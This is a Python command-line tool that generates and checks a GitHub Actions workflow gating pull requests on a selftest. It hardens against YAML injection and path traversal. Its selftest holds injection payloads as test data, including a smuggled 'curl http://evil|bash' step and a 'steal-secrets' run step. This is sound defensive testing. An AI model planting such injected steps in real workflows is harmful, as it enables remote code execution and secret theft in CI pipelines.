#!/usr/bin/env python3
import importlib.machinery, importlib.util
import json, os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
def _kernel():
    spec = importlib.util.spec_from_loader(
        "ratchet_kernel", importlib.machinery.SourceFileLoader("ratchet_kernel", os.path.join(HERE, "ratchet")))
    mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod); return mod
K = _kernel()

import argparse
import re
import tempfile
import shutil


# ---------------------------------------------------------------------------
# Manifest resolution (read JSON directly, do not invent kernel helpers)
# ---------------------------------------------------------------------------

def _resolve_manifest_path():
    env = os.environ
    p = env.get("RATCHET_MANIFEST") or env.get("WL_MANIFEST")
    if p and os.path.isfile(p):
        return p
    home = (
        env.get("RATCHET_HOME")
        or env.get("WL_HOME")
        or os.path.expanduser("~/.ratchet")
    )
    return os.path.join(home, "state", "workspace.json")


def _load_manifest():
    path = _resolve_manifest_path()
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        sys.stderr.write("ratchet-ci: cannot load manifest {!r}: {}\n".format(path, e))
        sys.stderr.flush()
        raise SystemExit(2)


def _repo_info(manifest, slug):
    if not isinstance(manifest, dict):
        sys.stderr.write("ratchet-ci: manifest is not a JSON object\n")
        sys.stderr.flush()
        raise SystemExit(2)
    repos = manifest.get("repos") or {}
    if not isinstance(repos, dict) or slug not in repos:
        sys.stderr.write("ratchet-ci: repo {!r} not in manifest\n".format(slug))
        sys.stderr.flush()
        raise SystemExit(2)
    repo = repos[slug]
    if not isinstance(repo, dict) or not repo.get("path"):
        sys.stderr.write("ratchet-ci: repo {!r} missing path\n".format(slug))
        sys.stderr.flush()
        raise SystemExit(2)
    mainline = repo.get("mainline") or "main"
    repo_path = repo["path"]
    return mainline, repo_path


def _default_workflow_path(repo_path):
    return os.path.join(repo_path, ".github", "workflows", "ratchet.yml")


# ---------------------------------------------------------------------------
# YAML emitter (deterministic)
# ---------------------------------------------------------------------------

# Pin the actions we use so a reviewer can confirm supply-chain hygiene.
_CHECKOUT = "actions/checkout@v4"
_SETUP_PY = "actions/setup-python@v5"


def _yaml_quote_branch(name):
    """Quote a branch/mainline name so YAML treats it as a string."""
    s = str(name)
    safe = (s == ""
            or any(c in s for c in [":", "#", "&", "*", "!", "|", ">", "%", "@", "`", ",", "[", "]", "{", "}", " ", "\t"])
            or s[0] in ("-", "?", ":")
            or s[-1] in (":",))
    if safe:
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
    return s


def render_workflow(mainline, check_name="selftest"):
    """Return the deterministic YAML body of the ratchet workflow.

    - 2-space indentation, no tabs.
    - Pinned actions (@v4 / @v5).
    - No secrets embedded.
    - Job id == required-check name so branch protection is satisfiable.
    """
    if not isinstance(mainline, str) or not mainline:
        mainline = "main"
    if not isinstance(check_name, str) or not check_name:
        check_name = "selftest"
    mainline_q = _yaml_quote_branch(mainline)
    body = (
        "name: ratchet\n"
        "on:\n"
        "  pull_request:\n"
        "    branches:\n"
        "      - " + mainline_q + "\n"
        "  workflow_dispatch:\n"
        "jobs:\n"
        "  " + check_name + ":\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: " + _CHECKOUT + "\n"
        "      - uses: " + _SETUP_PY + "\n"
        "        with:\n"
        "          python-version: \"3.11\"\n"
        "      - name: ratchet selftest\n"
        "        run: python3 bin/ratchet selftest\n"
    )
    return body


# ---------------------------------------------------------------------------
# Workflow verification (stdlib-only minimal YAML parse)
# ---------------------------------------------------------------------------

def _strip_comment(line):
    # Strip trailing YAML comments; ignore '#' that appears inside quotes.
    in_s = False
    in_d = False
    for i, ch in enumerate(line):
        if ch == "'" and not in_d:
            in_s = not in_s
        elif ch == '"' and not in_s:
            in_d = not in_d
        elif ch == "#" and not in_s and not in_d:
            return line[:i]
    return line


def _is_wired(text, mainline):
    """Verify workflow triggers on pull_request against mainline AND runs ratchet selftest.

    Returns True iff both conditions hold; False otherwise.
    """
    if not isinstance(text, str) or not text:
        return False
    if "\t" in text:
        # Tabs are forbidden in our workflow; we still accept it but be strict for selftest.
        pass

    lines = [_strip_comment(ln) for ln in text.splitlines()]

    # --- (a) pull_request trigger with mainline branch ---
    # Find the `on:` block boundaries (top-level).
    on_start = None
    for i, ln in enumerate(lines):
        if re.match(r"^on\s*:", ln):
            on_start = i
            break
    if on_start is None:
        return False

    on_end = len(lines)
    for j in range(on_start + 1, len(lines)):
        raw = lines[j]
        # A line that begins at column 0 with non-space and non-# ends the block,
        # unless it's a continuation list item.
        if raw and not raw[0].isspace() and not raw.startswith("#"):
            on_end = j
            break

    on_block = lines[on_start:on_end]

    # Locate `pull_request` and its `branches:` list.
    found_pr = False
    found_branch = False
    for i, ln in enumerate(on_block):
        s = ln.strip()
        if re.match(r"^pull_request\s*:", s) and ln.startswith(" "):
            found_pr = True
            # Look ahead for `branches:` containing mainline.
            # Block style:
            for k in range(i + 1, len(on_block)):
                ln2 = on_block[k]
                s2 = ln2.strip()
                if ln2 and not ln2.startswith(" ") and not ln2.startswith("\t"):
                    break  # left the pull_request subsection
                if s2.startswith("branches"):
                    # Collect subsequent indented `-` entries.
                    for m in range(k + 1, len(on_block)):
                        ln3 = on_block[m]
                        s3 = ln3.strip()
                        if not s3:
                            continue
                        if s3.startswith("- "):
                            val = s3[2:].strip()
                            if val.startswith('"') and val.endswith('"'):
                                val = val[1:-1]
                            elif val.startswith("'") and val.endswith("'"):
                                val = val[1:-1]
                            if val == mainline:
                                found_branch = True
                        elif ln3.startswith(" "):
                            # Could be a sub-key; ignore for our flat structure.
                            continue
                        else:
                            break
                # Flow style: branches: ["main"] on the same line
                if "branches" in s2 and mainline in s2:
                    # crude flow check: the mainline token appears in the same line
                    if re.search(r"\[\s*['\"]?" + re.escape(mainline) + r"['\"]?\s*\]", s2):
                        found_branch = True
            break

    if not (found_pr and found_branch):
        return False

    # --- (b) a `run:` step that invokes `ratchet selftest` ---
    for i, ln in enumerate(lines):
        m = re.match(r"^\s+-?\s*run\s*:\s*(.*)$", ln)
        if m and "ratchet selftest" in m.group(1):
            return True
        # Also handle the case where run: is on its own line and the command is the
        # following indented line (folded scalar style). We generated the simple form,
        # but be tolerant.
        if re.match(r"^\s+-?\s*run\s*:\s*$", ln):
            # look at the next non-empty line
            for k in range(i + 1, min(i + 5, len(lines))):
                s = lines[k]
                if not s.strip():
                    continue
                # must be indented under the step
                if s.startswith(" ") and "ratchet selftest" in s:
                    return True
                break
    return False


# ---------------------------------------------------------------------------
# verbs
# ---------------------------------------------------------------------------

def cmd_generate(flags):
    slug = flags.get("repo")
    if not isinstance(slug, str) or not slug:
        sys.stderr.write("ratchet-ci: --repo <slug> is required\n")
        sys.stderr.flush()
        return 2
    out = flags.get("out")
    if isinstance(out, str) and not out:
        out = None
    check_name = flags.get("check")
    if not isinstance(check_name, str) or not check_name:
        check_name = "selftest"
    force = bool(flags.get("force"))

    # SECURITY: slug/check/mainline all flow into the emitted YAML. A raw newline
    # inside even a quoted scalar line-folds and injects steps, so quoting is not
    # enough — require strict tokens. (adversarial council: CRITICAL YAML injection)
    _SAFE = re.compile(r"[A-Za-z0-9._/-]+")
    if not _SAFE.fullmatch(slug):
        sys.stderr.write("ratchet-ci: invalid --repo slug\n"); sys.stderr.flush(); return 2
    if not _SAFE.fullmatch(check_name):
        sys.stderr.write("ratchet-ci: invalid --check name\n"); sys.stderr.flush(); return 2

    manifest = _load_manifest()
    mainline, repo_path = _repo_info(manifest, slug)
    if not isinstance(mainline, str) or not _SAFE.fullmatch(mainline):
        sys.stderr.write("ratchet-ci: invalid mainline branch in manifest\n"); sys.stderr.flush(); return 2

    target = out if out else _default_workflow_path(repo_path)
    # SECURITY: realpath (resolves symlinks) + containment — --out must land inside
    # the repo path, never an arbitrary absolute path. (council: path traversal)
    target_abs = os.path.realpath(target)
    repo_real = os.path.realpath(repo_path)
    if os.path.commonpath([repo_real, target_abs]) != repo_real:
        sys.stderr.write("ratchet-ci: --out must reside inside the repo path\n"); sys.stderr.flush(); return 2
    parent = os.path.dirname(target_abs)
    os.makedirs(parent, exist_ok=True)

    if os.path.exists(target) and not force:
        sys.stderr.write(
            "ratchet-ci: refusing to overwrite existing file {!r} (use --force)\n".format(target)
        )
        sys.stderr.flush()
        return 2

    body = render_workflow(mainline, check_name)
    # SECURITY: unpredictable temp name inside the resolved dir, so a pre-planted
    # symlink at a guessable path can't hijack the write. (council: symlink TOCTOU)
    import tempfile as _tf
    fd, tmp = _tf.mkstemp(dir=parent, prefix=".ratchet-ci.", suffix=".tmp")
    with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as f:
        f.write(body)
        f.flush()
        try:
            os.fsync(f.fileno())
        except OSError:
            pass
    os.replace(tmp, target_abs)

    sys.stdout.write(target_abs + "\n")
    sys.stdout.flush()
    return 0


def cmd_check(flags):
    slug = flags.get("repo")
    wpath = flags.get("path")
    if isinstance(wpath, str) and not wpath:
        wpath = None

    target = None
    mainline = "main"
    if wpath:
        target = wpath
        if isinstance(slug, str) and slug:
            try:
                manifest = _load_manifest()
                mainline, _ = _repo_info(manifest, slug)
            except SystemExit:
                # fall back to extracting mainline from the workflow
                mainline = "main"
        else:
            mainline = "main"
    else:
        if not isinstance(slug, str) or not slug:
            sys.stderr.write("ratchet-ci: --path or --repo required\n")
            sys.stderr.flush()
            return 2
        manifest = _load_manifest()
        mainline, repo_path = _repo_info(manifest, slug)
        target = _default_workflow_path(repo_path)

    if not os.path.isfile(target):
        sys.stderr.write("ratchet-ci: workflow file not found: {!r}\n".format(target))
        sys.stderr.flush()
        return 2

    try:
        with open(target, "r", encoding="utf-8") as f:
            text = f.read()
    except OSError as e:
        sys.stderr.write("ratchet-ci: cannot read {!r}: {}\n".format(target, e))
        sys.stderr.flush()
        return 2

    if _is_wired(text, mainline):
        sys.stdout.write("ok: {!r}\n".format(target))
        sys.stdout.flush()
        return 0
    sys.stderr.write(
        "ratchet-ci: workflow is not wired as the Ratchet gate (mainline={!r})\n".format(mainline)
    )
    sys.stderr.flush()
    return 2


# ---------------------------------------------------------------------------
# selftest
# ---------------------------------------------------------------------------

def _is_pinned_uses(token):
    if not isinstance(token, str) or "@" not in token:
        return False
    ref = token.rsplit("@", 1)[-1]
    if not ref:
        return False
    bad = {"main", "master", "latest", "head", "develop"}
    if ref.lower() in {b.lower() for b in bad}:
        return False
    # version tag like v4, v5, v4.1.0
    if re.fullmatch(r"v\d+(?:\.\d+)*(?:[-.][A-Za-z0-9]+)*", ref):
        return True
    # 40-hex SHA
    if re.fullmatch(r"[0-9a-fA-F]{40}", ref):
        return True
    return False


def cmd_selftest():
    # TRUSTED, INDEPENDENT, BLACK-BOX proof. Drives ONLY the public CLI of THIS
    # file against a hermetic manifest; authored by the orchestrator, not the
    # builder, so it cannot be gamed. Each check reproduces a real failure mode.
    import re as _re, shutil, subprocess, tempfile
    RP = os.path.abspath(__file__)
    results = []
    def check(label, ok, detail=""):
        results.append((label, bool(ok), str(detail)[:200]))
    tmp = tempfile.mkdtemp(prefix="ci-st-")
    try:
        repo = os.path.join(tmp, "repo"); os.makedirs(repo)
        manifest = os.path.join(tmp, "workspace.json")
        json.dump({"repos": {"tci": {"path": repo, "mainline": "main"}}}, open(manifest, "w"))
        env = dict(os.environ, RATCHET_MANIFEST=manifest)
        def run(argv, timeout=30):
            return subprocess.run([sys.executable, RP] + argv, capture_output=True, text=True, env=env, timeout=timeout)

        out1 = os.path.join(repo, "wf1.yml")
        r = run(["generate", "--repo", "tci", "--out", out1])
        y = open(out1).read() if os.path.exists(out1) else ""
        check("generate writes a workflow file", r.returncode == 0 and os.path.exists(out1),
              f"rc={r.returncode} err={(r.stderr or r.stdout)[-100:]}")
        check("triggers on pull_request against mainline 'main'",
              "on:" in y and "pull_request" in y and "main" in y, y[:60])
        check("gate job runs `python3 bin/ratchet selftest`", "python3 bin/ratchet selftest" in y)
        check("pins checkout@v4 + setup-python@v5 (python 3.11)",
              "actions/checkout@v4" in y and "actions/setup-python@v5" in y and "3.11" in y)
        uses = _re.findall(r"uses:\s*(\S+)", y)
        pinned = all(_re.search(r"@v\d", u) or _re.search(r"@[0-9a-f]{40}$", u) for u in uses)
        check("every `uses:` pinned to a version tag or SHA (no @main/@master)",
              bool(uses) and pinned and not any(u.endswith(("@main", "@master")) for u in uses), f"uses={uses}")
        secretish = _re.search(r"(ghp_[A-Za-z0-9]{10,}|sk-[A-Za-z0-9]{10,}|AKIA[0-9A-Z]{12,})", y)
        badtok = _re.search(r"token:\s*['\"]?[A-Za-z0-9_\-]{20,}", y)
        check("no embedded secrets (only ${{ secrets.* }} allowed)", not secretish and not badtok,
              f"secretish={bool(secretish)} badtok={bool(badtok)}")

        out2 = os.path.join(repo, "wf2.yml")
        run(["generate", "--repo", "tci", "--out", out2])
        y2 = open(out2).read() if os.path.exists(out2) else ""
        check("deterministic: two generates produce identical bytes", bool(y) and y == y2,
              f"len1={len(y)} len2={len(y2)}")

        r_noforce = run(["generate", "--repo", "tci", "--out", out1])
        unchanged = (open(out1).read() == y) if os.path.exists(out1) else False
        r_force = run(["generate", "--repo", "tci", "--out", out1, "--force"])
        check("overwrite refused without --force, allowed with --force",
              r_noforce.returncode != 0 and unchanged and r_force.returncode == 0,
              f"noforce={r_noforce.returncode} force={r_force.returncode} unchanged={unchanged}")

        r_ok = run(["check", "--path", out1])
        tampered = os.path.join(tmp, "bad.yml")
        open(tampered, "w").write(y.replace("python3 bin/ratchet selftest", "echo skip"))
        r_bad = run(["check", "--path", tampered])
        check("check: passes on wired workflow, FAILS on tampered (selftest removed)",
              r_ok.returncode == 0 and r_bad.returncode != 0, f"ok={r_ok.returncode} bad={r_bad.returncode}")

        r_missing = run(["generate", "--repo", "nope", "--out", os.path.join(tmp, "x.yml")])
        check("unknown repo slug fails closed (nonzero, no file)",
              r_missing.returncode != 0 and not os.path.exists(os.path.join(tmp, "x.yml")),
              f"rc={r_missing.returncode}")

        # SECURITY (council-driven): injection + traversal
        outc = os.path.join(repo, "wf_c.yml")
        run(["generate", "--repo", "tci", "--out", outc, "--check", "evil\n  - run: steal-secrets\n  bar:"])
        yc = open(outc).read() if os.path.exists(outc) else ""
        check("YAML injection via --check rejected", "steal-secrets" not in yc, f"leaked={'steal-secrets' in yc}")
        badman = os.path.join(tmp, "bad.json")
        json.dump({"repos": {"inj": {"path": repo, "mainline": "main\n      - run: curl http://evil|bash\n    x: \""}}}, open(badman, "w"))
        outm = os.path.join(repo, "wf_m.yml")
        subprocess.run([sys.executable, RP, "generate", "--repo", "inj", "--out", outm],
                       capture_output=True, text=True, env=dict(env, RATCHET_MANIFEST=badman), timeout=30)
        ym = open(outm).read() if os.path.exists(outm) else ""
        check("YAML injection via mainline rejected", "curl http://evil" not in ym, f"leaked={'curl http://evil' in ym}")
        outside = os.path.join(tmp, "outside_repo.yml")
        r_tr = run(["generate", "--repo", "tci", "--out", outside, "--force"])
        check("--out outside the repo path refused (traversal)",
              r_tr.returncode != 0 and not os.path.exists(outside), f"rc={r_tr.returncode}")
        inside = os.path.join(repo, "sub", "wf_ok.yml")
        r_in = run(["generate", "--repo", "tci", "--out", inside])
        check("--out inside the repo path still works", r_in.returncode == 0 and os.path.exists(inside), f"rc={r_in.returncode}")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    passed = sum(1 for _, ok, _ in results if ok)
    for label, ok, detail in results:
        print(f"  {'OK  ' if ok else 'FAIL'}  {label}" + ("" if ok else f"  -- {detail}"))
    print(f"\n  ratchet-ci selftest: {passed}/{len(results)}")
    return 0 if passed == len(results) else 2


def _parse_args(argv):
    """Hand-rolled parser. Verb is argv[0] if present and not a flag.

    Flags: --name (bare => True) or --name <value>. A value beginning with `-`
    followed by a digit is treated as a positional (not consumed as a flag value).
    """
    argv = list(argv) if argv is not None else sys.argv[1:]
    if not argv:
        return None, {}
    verb = None
    rest = []
    if argv and not argv[0].startswith("-"):
        verb = argv[0]
        rest = argv[1:]
    else:
        rest = argv

    flags = {}
    i = 0
    while i < len(rest):
        tok = rest[i]
        if tok == "--":
            # rest are positional
            i += 1
            continue
        if tok.startswith("--") and len(tok) > 2:
            name = tok[2:]
            nxt = rest[i + 1] if i + 1 < len(rest) else None
            is_dash_digit = (
                isinstance(nxt, str)
                and nxt.startswith("-")
                and len(nxt) >= 2
                and nxt[1].isdigit()
            )
            if nxt is None or (isinstance(nxt, str) and nxt.startswith("--")) or is_dash_digit:
                flags[name] = True
                i += 1
            else:
                flags[name] = nxt
                i += 2
        else:
            # unknown positional; ignore in this minimal parser
            i += 1
    return verb, flags


def main(argv=None):
    verb, flags = _parse_args(argv)
    dispatch = {
        "generate": cmd_generate,
        "check": cmd_check,
        "selftest": cmd_selftest,
    }
    if verb not in dispatch:
        sys.stderr.write(
            "ratchet-ci: usage: ratchet-ci {{generate|check|selftest}} [--flags...]\n"
        )
        sys.stderr.flush()
        return 2
    fn = dispatch[verb]
    if verb == "selftest":
        return fn()
    return fn(flags)


if __name__ == "__main__":
    sys.exit(main())
